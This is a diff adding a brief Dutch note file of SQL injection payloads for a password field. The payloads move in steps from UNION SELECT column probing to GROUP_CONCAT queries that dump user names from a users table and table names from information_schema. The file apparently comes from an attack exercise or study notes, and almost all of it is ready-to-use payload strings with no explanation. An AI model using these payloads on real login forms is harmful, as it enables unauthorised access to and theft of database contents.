@@ -1,0 +1,10 @@
+zet in password veld:
+
+' UNION SELECT 1' #
+
+' UNION SELECT 1,2,3,4' #
+
+' UNION SELECT 1,2,3,GROUP_CONCAT(name) FROM users #
+
+' UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables  WHERE table_schema NOT IN ('sys', 'mysql', 'information_schema') #
+
